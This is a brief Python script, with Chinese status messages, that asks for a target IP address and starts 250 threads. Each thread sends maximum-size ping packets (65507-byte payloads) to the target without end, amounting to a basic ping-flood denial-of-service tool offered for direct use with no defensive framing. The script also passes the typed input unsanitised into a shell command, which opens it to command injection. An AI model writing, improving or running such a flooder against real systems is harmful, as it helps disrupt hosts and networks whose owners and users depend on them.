#!/usr/bin/python3
import os,sys,_thread
address=input('IP:')
def ping(ip,number):
    command='ping -s 65507 '+ip+'>> /dev/null'
    print('线程%s开始执行'%number)
    os.system(command)
for i in range(1,251):
    _thread.start_new_thread(ping,(address,i,))
    print('启动线程%s'%i)
while 1:
    pass
